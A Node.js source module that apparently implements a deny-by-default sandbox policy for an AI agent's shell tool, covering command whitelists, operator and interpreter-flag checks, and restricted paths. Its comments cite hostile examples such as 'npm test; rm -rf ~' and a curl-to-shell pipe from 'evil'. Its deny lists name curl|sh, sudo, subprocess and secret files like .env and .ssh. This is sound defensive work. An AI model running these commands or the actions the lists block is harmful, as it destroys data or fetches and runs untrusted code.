'use strict';

/* Reach Studio — sandboxed tool & terminal execution policy.
 *
 * The agent's `shell` tool currently runs any command the model asks for,
 * gated only by a user approval click. That is fine for a supervised
 * conversation, but the PRD's Phase 2 sandbox story needs a policy layer that
 * is enforced by CODE rather than by the user remembering what they clicked:
 * a command whitelist, restricted path rules, and an immutable audit log.
 *
 * Design rules this module obeys:
 *
 *   - Pure decisions, no execution. evaluateCommand() answers "may this run?"
 *     and returns a verdict. Actually spawning stays in platform.cjs, so the
 *     policy is unit-testable without touching a shell and cannot be bypassed
 *     by a caller that forgot to sanitize.
 *
 *   - Deny by default. An unknown binary is denied. An empty or misconfigured
 *     whitelist denies everything rather than everything being allowed —
 *     failing open here would be worse than failing closed.
 *
 *   - Parse the whole command line, not just argv[0]. Shell metacharacters let
 *     an innocuous-looking prefix hide a second command (`npm test; rm -rf ~`,
 *     `git status && curl evil|sh`), so a whitelist that only checked the
 *     first token would be decorative.
 *
 *   - Zero dependencies, like everything else in agent/: the packaged app
 *     ships no node_modules.
 */

const path = require('node:path');

/* --------------------------------------------------------------- policy shape */

/**
 * A policy is plain JSON so it can live in settings and be shown in the UI.
 *
 *   allowBinaries   — executable names permitted (e.g. ['npm','node','git'])
 *   allowArguments  — optional per-binary argument whitelist. Each entry is a
 *                     RegExp (or source string) an argument must match, or an
 *                     { anyAfter: RegExp } marker meaning "once a token matches
 *                     this, the remaining tokens are free-form" — needed for
 *                     `npm run <script>`, where script names are project-
 *                     defined and cannot be enumerated. Free-form still passes
 *                     through denyArguments and the path checks, so it widens
 *                     convenience without widening what is destructive.
 *   denyArguments   — patterns rejected anywhere (destructive flags)
 *   denyOperators   — shell operators that are refused outright
 *   allowOperators  — operators permitted when chaining is enabled
 *   writableRoots   — project-relative directories writes may touch
 *   denyPaths       — path fragments never touched, even inside a writable root
 *   allowChaining   — whether `&&` / `||` / `;` / pipes may join commands
 *   maxCommandLength — refuse absurdly long command lines
 */
const DEFAULT_DENY_OPERATORS = [';', '&&', '||', '|', '`', '$(', '>', '>>', '<', '&', '\n'];
const DEFAULT_ALLOW_OPERATORS = [];

/** Arguments that are destructive even for an otherwise-allowed binary. */
const DEFAULT_DENY_ARGUMENTS = [
  /\brm\b/i,
  /^-rf?$/i, /^--recursive$/i, /^--force$/i, /^-f$/i,
  /^--no-preserve-root$/i, /^--hard$/i, /^-dd$/i,
  /^--delete$/i, /^--purge$/i, /^--uninstall$/i,
  /^\s*\/s\s*\/f/i, /^\/q$/i,
  /^-9$/i, /^--kill$/i,
  /\bsudo\b/i, /\brunas\b/i,
  /\bchmod\s+[0-7]{3,4}\b/i, /\bchown\b/i,
  /\bcurl\b.*\|\s*(?:ba)?sh/i, /\bwget\b.*\|\s*(?:ba)?sh/i,
  /\bchild_process\b/i, /\bos\.system\b/i, /\bsubprocess\b/i, /\bshutil\.rmtree\b/i,
  /\bprocess\.binding\b/i, /\bprocess\.dlopen\b/i,
  /^--experimental-[a-z-]*vm[a-z-]*$/i,
  /^-delete$/i,
];

/**
 * Interpreter escape-hatch flags. These are only meaningful on an interpreter,
 * so they are checked against INTERPRETERS rather than globally: a blanket
 * "deny any flag containing e" rule also killed `find . -name "*.cjs"`, and a
 * blanket `-c` rule killed `grep -c`.
 *
 * `node -e`, `python -c`, `perl -e` and friends execute arbitrary inline code,
 * which makes the binary whitelist worthless — anything denied above can be
 * rebuilt inside a string and handed to child_process.
 */
const INTERPRETERS = new Set([
  'node', 'nodejs', 'deno', 'bun', 'python', 'python2', 'python3', 'perl', 'ruby',
  'php', 'lua', 'osascript', 'jrunscript', 'jjs', 'groovy', 'scala', 'tclsh', 'wish',
]);
const EVAL_FLAGS = [
  /^-e$/i, /^-p$/i, /^-c$/i, /^--eval$/i, /^--print$/i, /^--code$/i,
  /^-i$/i, /^--interactive$/i, /^--command$/i,
  /^-[a-zA-Z]{2,4}$/i,   // clustered short flags such as -ce, -pe, -ic
];
// NOTE: `-m` is deliberately NOT an eval flag — `python -m pytest` and
// `python -m unittest` are the normal way to run a suite. The dangerous case
// is `python -m <module>`, handled by INTERPRETER_MODULE_DENY on token pairs.

const MAX_COMMAND_LENGTH = 4000;

/** Dangerous interpreter modules, checked against joined token pairs because
 *  `-m subprocess` arrives as two arguments. */
const INTERPRETER_MODULE_DENY = [
  /^-m\s+(?:os|subprocess|shutil|ctypes|socket|multiprocessing|code|pty|webbrowser)$/i,
  /^--module\s+(?:os|subprocess|shutil|ctypes|socket|multiprocessing)$/i,
];

/** A sane starting policy: read-only-ish developer commands, no chaining. */
function defaultPolicy(overrides = {}) {
  return {
    allowBinaries: ['node', 'npm', 'git', 'python', 'python3', 'pytest', 'ls', 'cat', 'rg', 'grep', 'find', 'echo'],
    allowArguments: {
      // git: read-only inspection only. The subcommand opens a free-form
      // region (paths, refs and flags are all legitimate arguments to `log`),
      // and any mutating subcommand — push, commit, clean, reset, checkout,
      // merge, rebase — simply never matches, so it is denied by omission.
      // An earlier version had a catch-all /^[A-Za-z0-9_/.@^~:-]+$/ here which
      // matched every subcommand and made the whitelist decorative: `git push
      // origin main` and `git clean -fd` both passed.
      git: [{ anyAfter: /^(status|log|diff|show|branch|rev-parse|ls-files|blame|describe|tag|remote|cat-file|reflog|shortlog|grep|whatchanged|count-objects)$/ }, /^-/],
      // npm/npx: run scripts and install into the project, never publish.
      // `run`/`exec` take a project-defined script name, so the rest of the
      // line is free-form (deny rules still apply).
      npm: [{ anyAfter: /^(run|exec|why)$/ }, /^(test|ci|install|i|ls|list|audit|outdated|view|help|dedupe)$/],
    },
    denyArguments: DEFAULT_DENY_ARGUMENTS,
    denyOperators: DEFAULT_DENY_OPERATORS,
    allowOperators: DEFAULT_ALLOW_OPERATORS,
    writableRoots: ['.'],
    denyPaths: ['.git', 'node_modules', '.env', '.ssh', '/etc', '/usr', 'C:\\Windows', '%SystemRoot%'],
    allowChaining: false,
    maxCommandLength: MAX_COMMAND_LENGTH,
    ...overrides,
  };
}

/** Validate an untrusted policy object (it comes from settings JSON). */
function validatePolicy(policy) {
  if (!policy || typeof policy !== 'object' || Array.isArray(policy)) {
    throw new Error('Sandbox policy must be an object.');
  }
  const out = {};
  const strArray = (value, field, required) => {
    if (value === undefined || value === null) {
      if (required) throw new Error(`${field} must be an array of strings.`);
      return null;
    }
    if (!Array.isArray(value) || value.some(v => typeof v !== 'string' || !v.trim())) {
      throw new Error(`${field} must be an array of non-empty strings.`);
    }
    return value.map(v => v.trim());
  };
  // Operator lists must NOT be trimmed: '\n' is a legitimate operator, and
  // trimming it yields an empty string that the check above rejects. An early
  // version ran every command through this path and denied them all with
  // "policy-invalid" — fail-closed, but useless.
  const opArray = (value, field, fallback) => {
    if (value === undefined || value === null) return fallback;
    if (!Array.isArray(value) || value.some(v => typeof v !== 'string' || v.length === 0)) {
      throw new Error(`${field} must be an array of non-empty strings.`);
    }
    return value.slice();
  };

  out.allowBinaries = strArray(policy.allowBinaries, 'allowBinaries', true) || [];
  if (!out.allowBinaries.length) throw new Error('allowBinaries must list at least one command.');
  // A binary name containing a separator or shell metacharacter is not a
  // binary — it is an attempt to smuggle a path or an operator past the check.
  for (const bin of out.allowBinaries) {
    if (/[\s;|&<>`$()*'"\\/]/.test(bin)) {
      throw new Error(`allowBinaries entry "${bin}" is not a plain command name.`);
    }
  }

  if (policy.allowArguments !== undefined && policy.allowArguments !== null) {
    if (typeof policy.allowArguments !== 'object' || Array.isArray(policy.allowArguments)) {
      throw new Error('allowArguments must map a binary to an array of patterns.');
    }
    out.allowArguments = {};
    for (const [bin, patterns] of Object.entries(policy.allowArguments)) {
      if (!Array.isArray(patterns)) throw new Error(`allowArguments["${bin}"] must be an array.`);
      out.allowArguments[bin] = patterns.map(p => {
        // { anyAfter: RegExp } marks where free-form arguments begin.
        if (p && typeof p === 'object' && !(p instanceof RegExp) && 'anyAfter' in p) {
          return { anyAfter: toRegExp(p.anyAfter, `allowArguments["${bin}"].anyAfter`) };
        }
        return toRegExp(p, `allowArguments["${bin}"]`);
      });
    }
  } else {
    out.allowArguments = null;
  }

  out.denyArguments = (policy.denyArguments === undefined || policy.denyArguments === null)
    ? DEFAULT_DENY_ARGUMENTS
    : (Array.isArray(policy.denyArguments)
      ? policy.denyArguments.map(p => toRegExp(p, 'denyArguments'))
      : (() => { throw new Error('denyArguments must be an array.'); })());

  out.denyOperators = opArray(policy.denyOperators, 'denyOperators', DEFAULT_DENY_OPERATORS);
  out.allowOperators = opArray(policy.allowOperators, 'allowOperators', DEFAULT_ALLOW_OPERATORS);
  out.writableRoots = strArray(policy.writableRoots, 'writableRoots', false) ?? ['.'];
  out.denyPaths = strArray(policy.denyPaths, 'denyPaths', false) ?? [];

  if (policy.allowChaining !== undefined && typeof policy.allowChaining !== 'boolean') {
    throw new Error('allowChaining must be true or false.');
  }
  out.allowChaining = policy.allowChaining === true;

  const max = policy.maxCommandLength;
  if (max !== undefined && max !== null) {
    if (!Number.isSafeInteger(max) || max < 16 || max > 65536) {
      throw new Error('maxCommandLength must be a whole number from 16 to 65536.');
    }
    out.maxCommandLength = max;
  } else {
    out.maxCommandLength = MAX_COMMAND_LENGTH;
  }
  return out;
}

/** Accept a RegExp or a source string so policies survive JSON round-trips. */
function toRegExp(pattern, field) {
  if (pattern instanceof RegExp) return pattern;
  if (typeof pattern === 'string') {
    try { return new RegExp(pattern, 'i'); }
    catch (error) { throw new Error(`${field} pattern "${pattern}" is not a valid regular expression: ${error.message}`); }
  }
  throw new Error(`${field} entries must be strings or regular expressions.`);
}

/* ------------------------------------------------------------------- parsing */

/**
 * Split a command line into tokens, respecting single/double quotes. Returns
 * {tokens, quotes} where quotes records which tokens were quoted (a quoted
 * token is data, so an operator inside quotes is not an operator).
 *
 * This is a tokenizer, not a shell: it deliberately does NOT expand variables
 * or perform globbing, because expansion is exactly how a payload smuggles
 * itself past a whitelist. Anything the tokenizer cannot resolve is left
 * literal for the deny rules to catch.
 */
function tokenize(command) {
  const src = String(command == null ? '' : command);
  const tokens = [];
  const quoted = [];
  let current = '';
  let quote = null;
  let hasToken = false;
  let escaped = false;

  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (escaped) { current += ch; escaped = false; hasToken = true; continue; }
    if (ch === '\\') { escaped = true; hasToken = true; continue; }
    if (quote) {
      if (ch === quote) { quote = null; }
      else current += ch;
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; hasToken = true; continue; }
    if (/\s/.test(ch)) {
      if (hasToken) { tokens.push(current); quoted.push(false); current = ''; hasToken = false; }
      continue;
    }
    current += ch;
    hasToken = true;
  }
  if (hasToken) { tokens.push(current); quoted.push(!!quote); }
  return { tokens, quoted, unterminatedQuote: !!quote, raw: src };
}

/**
 * Find shell operators present OUTSIDE quotes. Returns [{op, index}] so the
 * verdict can quote the offending text back to the user.
 */
function findOperators(command, operators) {
  const src = String(command == null ? '' : command);
  const found = [];
  let quote = null;
  let escaped = false;
  // Longest operators first so '&&' is reported instead of two '&'.
  const sorted = [...operators].filter(Boolean).sort((a, b) => b.length - a.length);
  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (escaped) { escaped = false; continue; }
    if (ch === '\\') { escaped = true; continue; }
    if (quote) { if (ch === quote) quote = null; continue; }
    if (ch === '"' || ch === "'") { quote = ch; continue; }
    for (const op of sorted) {
      if (op === '\n') { if (ch === '\n') found.push({ op, index: i }); continue; }
      if (src.startsWith(op, i)) { found.push({ op, index: i }); i += op.length - 1; break; }
    }
  }
  return found;
}

/**
 * The command with quoted regions blanked out (quotes themselves included).
 * Used for pattern scans that must only consider code, not data: a `>` inside
 * `echo "5 > 3"` is literal text and must not read as output redirection.
 * Newlines are preserved so line-based patterns still work.
 */
function unquotedView(command) {
  const src = String(command == null ? '' : command);
  const out = [];
  let quote = null;
  let escaped = false;
  for (let i = 0; i < src.length; i++) {
    const ch = src[i];
    if (escaped) { escaped = false; out.push(quote ? ' ' : ch); continue; }
    if (ch === '\\') { escaped = true; out.push(quote ? ' ' : ch); continue; }
    if (quote) {
      if (ch === quote) quote = null;
      out.push(ch === '\n' ? '\n' : ' ');
      continue;
    }
    if (ch === '"' || ch === "'") { quote = ch; out.push(' '); continue; }
    out.push(ch);
  }
  return out.join('');
}

/** Strip a leading Windows drive or a relative path prefix to get the binary name. */
function binaryName(token) {
  const base = String(token || '').split(/[\\/]/).pop() || '';
  return base.replace(/\.(exe|cmd|bat|com|ps1|sh)$/i, '').trim();
}

/* ------------------------------------------------------------------ verdicts */

/**
 * Decide whether a command may run under a policy.
 *
 * Returns {allowed, reason, code, binary, args, findings[]} — findings are the
 * individual rule hits, which the audit log stores so a denial can be
 * explained rather than just asserted.
 */
function evaluateCommand(command, policyInput = {}, options = {}) {
  const findings = [];
  const deny = (code, reason, extra = {}) => ({
    allowed: false, code, reason, findings, command: String(command == null ? '' : command), ...extra,
  });
  const allow = (code, reason, extra = {}) => ({
    allowed: true, code, reason, findings, command: String(command == null ? '' : command), ...extra,
  });

  let policy;
  try { policy = validatePolicy(policyInput); }
  catch (error) { return deny('policy-invalid', `Sandbox policy rejected: ${error.message}`); }

  const raw = String(command == null ? '' : command);
  if (!raw.trim()) return deny('empty', 'No command was supplied.');
  if (raw.length > policy.maxCommandLength) {
    return deny('too-long', `Command exceeds the ${policy.maxCommandLength} character limit.`);
  }

  // 1. Operators. Chaining is how a whitelisted prefix hides a second command.
  const operators = findOperators(raw, policy.denyOperators);
  if (operators.length) {
    const op = operators[0];
    const snippet = raw.slice(Math.max(0, op.index - 12), op.index + op.op.length + 12).trim();
    if (!policy.allowChaining || !policy.allowOperators.includes(op.op)) {
      findings.push({ rule: 'operator', value: op.op, detail: snippet });
      return deny('operator', `Shell operator "${op.op.trim() || 'newline'}" is not permitted near: …${snippet}…`, { operator: op.op });
    }
  }

  // 2. Command substitution / redirection are always denied: they create new
  //    commands or files the whitelist never saw. Scanned against the
  //    quote-blanked view so literal operators inside string DATA (e.g.
  //    `echo "5 > 3"`) are not mistaken for shell redirection.
  const codeView = unquotedView(raw);
  const substitution = [
    { re: /\$\([^)]*\)/, label: '$( … ) command substitution' },
    { re: /`[^`]*`/, label: 'backtick command substitution' },
    { re: /\|\s*(?:ba)?sh\b/i, label: 'pipe into a shell' },
    { re: />>?/, label: 'output redirection' },
    { re: /<[^<]/, label: 'input redirection' },
  ];
  for (const { re, label } of substitution) {
    const m = re.exec(codeView);
    if (m) {
      findings.push({ rule: 'substitution', value: label, detail: m[0] });
      return deny('substitution', `${label} is not permitted: ${m[0].trim().slice(0, 60)}`);
    }
  }

  // 3. Tokenize and identify the binary.
  const { tokens, quoted, unterminatedQuote } = tokenize(raw);
  if (unterminatedQuote) return deny('unterminated-quote', 'The command has an unterminated quote.');
  if (!tokens.length) return deny('empty', 'No command was supplied.');

  // A leading env assignment or wrapper (env, sudo, command) is not the
  // binary; sudo/command are denied outright because they escalate.
  let cursor = 0;
  while (cursor < tokens.length && /^[A-Za-z_][\w]*=/.test(tokens[cursor])) cursor++;
  if (cursor >= tokens.length) return deny('no-binary', 'The command starts with a variable assignment and runs nothing.');

  const escapers = new Set(['sudo', 'su', 'doas', 'runas', 'pkexec', 'command', 'env', 'xargs', 'eval', 'exec', 'nohup', 'time', 'nice', 'setsid', 'wsl', 'wsl.exe', 'ssh', 'docker', 'podman']);
  const firstRaw = tokens[cursor];
  const first = binaryName(firstRaw);
  if (escapers.has(first.toLowerCase())) {
    findings.push({ rule: 'escaper', value: first });
    return deny('escaper', `"${first}" wraps or escalates other commands and cannot be sandboxed. Run the underlying command directly.`, { binary: first });
  }

  const allowSet = new Set(policy.allowBinaries.map(b => b.toLowerCase()));
  if (!allowSet.has(first.toLowerCase())) {
    findings.push({ rule: 'binary', value: first });
    return deny('binary-not-allowed', `"${first}" is not in the command whitelist. Allowed: ${policy.allowBinaries.join(', ')}.`, { binary: first });
  }

  // A path-qualified binary (./script.sh, ../bin/tool) can point anywhere;
  // only allow it when the bare name is whitelisted AND the path stays inside
  // a writable root.
  if (firstRaw !== first && /[\\/]/.test(firstRaw)) {
    const inside = pathIsAllowed(firstRaw, policy, options.projectDir);
    if (!inside.ok) {
      findings.push({ rule: 'binary-path', value: firstRaw, detail: inside.reason });
      return deny('binary-path', `Refusing to run "${firstRaw}" from outside the project: ${inside.reason}`, { binary: first });
    }
  }

  const args = tokens.slice(cursor + 1);

  // 3b. Interpreter eval flags are binary-specific: `node -e`, `python -c`,
  //     `ruby -e`, etc. run arbitrary inline code and defeat the whitelist.
  //     Checked only for interpreters so ordinary flags like `find -name`,
  //     `grep -c` and `ls -i` are unaffected.
  if (INTERPRETERS.has(first.toLowerCase())) {
    for (const arg of args) {
      if (EVAL_FLAGS.some(re => re.test(arg))) {
        findings.push({ rule: 'interpreter-eval', value: arg, detail: first });
        return deny('interpreter-eval', `${first} ${arg} runs inline code, which bypasses the sandbox. Put the code in a file and run that instead.`, { binary: first, argument: arg });
      }
    }
  }

  // 4. Per-binary argument whitelist.
  const argRules = policy.allowArguments && policy.allowArguments[first.toLowerCase()];
  if (argRules && argRules.length) {
    const plain = argRules.filter(r => r instanceof RegExp);
    const freeAfter = argRules.filter(r => r && !(r instanceof RegExp) && r.anyAfter).map(r => r.anyAfter);
    let freeForm = false;
    for (const arg of args) {
      if (freeForm) continue;                       // past a free-form marker
      if (plain.some(re => re.test(arg))) continue; // explicitly allowed
      // This token is not itself allowed — but if it opens a free-form region
      // (`npm run <script>`), the marker consumes it and everything after.
      if (freeAfter.some(re => re.test(arg))) { freeForm = true; continue; }
      findings.push({ rule: 'allowArguments', value: arg, detail: first });
      return deny('argument-not-allowed', `Argument "${arg}" is not permitted for ${first}.`, { binary: first, argument: arg });
    }
  }

  // 5. Deny arguments anywhere on the line.
  //
  //    Deliberately applies to QUOTED arguments too. Shell quoting strips the
  //    quotes and passes the token through to the program unchanged — verified
  //    empirically: `find . "-delete"` behaves exactly like `find . -delete`,
  //    and `git reset "--hard"` is a hard reset. Treating quotes as a bypass
  //    would open a hole, so the accepted trade-off is a rare false positive on
  //    prose (`echo "use rm to delete files"` is denied). Fail closed.
  for (const arg of args) {
    for (const re of policy.denyArguments) {
      if (re.test(arg)) {
        findings.push({ rule: 'denyArguments', value: arg, detail: String(re) });
        return deny('argument-denied', `Argument "${arg}" matches a denied pattern.`, { binary: first, argument: arg });
      }
    }
  }
  // `-m subprocess` tokenizes as two arguments, so a single-token pattern
  // cannot see it. Join adjacent tokens and re-check the dangerous-module
  // rules against the pair.
  for (let a = 0; a + 1 < args.length; a++) {
    const pair = args[a] + ' ' + args[a + 1];
    for (const re of INTERPRETER_MODULE_DENY) {
      if (re.test(pair)) {
        findings.push({ rule: 'denyArguments-pair', value: pair, detail: String(re) });
        return deny('argument-denied', `Argument pair "${pair}" matches a denied pattern.`, { binary: first, argument: pair });
      }
    }
  }
  // Also scan the quote-blanked command line so a destructive phrase glued to
  // punctuation is caught, while literal text inside string data is not.
  for (const re of policy.denyArguments) {
    if (re.source.includes('\\b') && re.test(codeView) && !args.some(a => re.test(a))) {
      const m = re.exec(codeView);
      findings.push({ rule: 'denyArguments-raw', value: m ? m[0] : String(re) });
      return deny('argument-denied', `Command text matches a denied pattern: ${m ? m[0].trim() : String(re)}`, { binary: first });
    }
  }

  // 6. Path arguments must stay inside the project's writable roots.
  for (const arg of args) {
    const looksLikePath = /[\\/]/.test(arg) || arg.startsWith('~') || /^[A-Za-z]:/.test(arg);
    // Restricted names are checked for EVERY argument, not just ones that look
    // like paths: `cat .env` names the secret file with no separator at all, so
    // a separator-gated check let it straight through.
    const bare = String(arg).replace(/^["']|["']$/g, '').replace(/^[^=]*=/, '');
    for (const frag of policy.denyPaths || []) {
      if (!frag) continue;
      const norm = String(frag).split(path.sep).join('/').replace(/^\.?\//, '').replace(/\/+$/, '');
      if (!norm) continue;
      const target = bare.split(path.sep).join('/');
      const base = target.split('/').pop();
      // `.env.local`, `.env.production` etc. are the same secret family as
      // `.env` (the dotenv convention), so a deny entry for `.env` must cover
      // its suffixed variants too — exact matching let `cat .env.local` through.
      const deniedBase = (name) => name === norm || (/^\.env(\.|$)/i.test(name) && /^\.env$/i.test(norm));
      if (deniedBase(target) || deniedBase(base)
        || target.startsWith(norm + '/') || target.includes('/' + norm + '/') || target.endsWith('/' + norm)) {
        findings.push({ rule: 'denyPaths', value: arg, detail: norm });
        return deny('path-denied', `"${norm}" is on the restricted path list.`, { binary: first, path: arg });
      }
    }
    if (!looksLikePath) continue;
    const check = pathIsAllowed(arg, policy, options.projectDir);
    if (!check.ok) {
      findings.push({ rule: 'path', value: arg, detail: check.reason });
      return deny('path-denied', `Path "${arg}" is outside the sandbox: ${check.reason}`, { binary: first, path: arg });
    }
  }

  const verdict = allow('allowed', `"${first}" is permitted by the sandbox policy.`, {
    binary: first, args, quoted,
  });
  findings.push({ rule: 'allow', value: first });
  return verdict;
}

/**
 * Is a path argument safe? Denies absolute paths outside the project, parent
 * traversal, home-directory references, and anything matching denyPaths.
 */
function pathIsAllowed(rawPath, policy, projectDir) {
  const value = String(rawPath == null ? '' : rawPath).trim();
  if (!value) return { ok: true };
  // Strip surrounding quotes and a leading flag like --path=foo
  const cleaned = value.replace(/^["']|["']$/g, '').replace(/^[^=]*=/, '');
  if (!cleaned) return { ok: true };

  if (cleaned.startsWith('~')) return { ok: false, reason: 'home-directory references are not allowed.' };

  const deny = policy.denyPaths || [];
  for (const frag of deny) {
    if (!frag) continue;
    const norm = frag.split(path.sep).join('/').replace(/\/+$/, '');
    const target = cleaned.split(path.sep).join('/');
    if (norm && (target === norm || target.includes(norm + '/') || target.includes('/' + norm + '/')
      || target.endsWith('/' + norm) || target.toLowerCase() === norm.toLowerCase()
      || target.toLowerCase().includes(norm.toLowerCase() + '/'))) {
      return { ok: false, reason: `"${frag}" is on the restricted path list.` };
    }
  }

  const isAbsolute = /^([A-Za-z]:[\\/]|\\\\|\/)/.test(cleaned);
  if (isAbsolute) {
    if (!projectDir) return { ok: false, reason: 'absolute paths are not allowed.' };
    const root = path.resolve(String(projectDir));
    const resolved = path.resolve(root, cleaned);
    const rootWithSep = root.endsWith(path.sep) ? root : root + path.sep;
    if (resolved !== root && !resolved.startsWith(rootWithSep)) {
      return { ok: false, reason: 'the absolute path is outside the project directory.' };
    }
    const rel = path.relative(root, resolved).split(path.sep).join('/');
    return checkRelative(rel, policy);
  }
  if (/(^|[\\/])\.\.([\\/]|$)/.test(cleaned)) {
    return { ok: false, reason: 'parent-directory traversal (..) is not allowed.' };
  }
  return checkRelative(cleaned.split(path.sep).join('/'), policy);
}

function checkRelative(rel, policy) {
  const roots = (policy.writableRoots && policy.writableRoots.length ? policy.writableRoots : ['.'])
    .map(r => String(r).split(path.sep).join('/').replace(/^\.?\//, '').replace(/\/+$/, ''));
  const target = String(rel).replace(/^\.?\//, '');
  const inside = roots.some(root => root === '' || root === '.' || target === root
    || target.startsWith(root + '/') || root.startsWith(target + '/') || target === root);
  if (!inside) return { ok: false, reason: `the path is outside the writable roots (${roots.join(', ') || 'project root'}).` };
  for (const frag of policy.denyPaths || []) {
    if (!frag) continue;
    const norm = String(frag).split(path.sep).join('/').replace(/\/+$/, '');
    if (norm && (target === norm || target.startsWith(norm + '/') || target.includes('/' + norm + '/') || target.endsWith('/' + norm))) {
      return { ok: false, reason: `"${frag}" is on the restricted path list.` };
    }
  }
  return { ok: true };
}

/** Convenience: evaluate several commands, returning the first denial. */
function evaluateAll(commands, policy, options = {}) {
  const results = [];
  for (const command of Array.isArray(commands) ? commands : [commands]) {
    const verdict = evaluateCommand(command, policy, options);
    results.push(verdict);
    if (!verdict.allowed) return { allowed: false, verdict, results };
  }
  return { allowed: true, verdict: results[results.length - 1] || null, results };
}

module.exports = {
  DEFAULT_DENY_OPERATORS,
  DEFAULT_DENY_ARGUMENTS,
  INTERPRETERS,
  EVAL_FLAGS,
  INTERPRETER_MODULE_DENY,
  MAX_COMMAND_LENGTH,
  defaultPolicy,
  validatePolicy,
  toRegExp,
  tokenize,
  findOperators,
  unquotedView,
  binaryName,
  evaluateCommand,
  evaluateAll,
  pathIsAllowed,
};
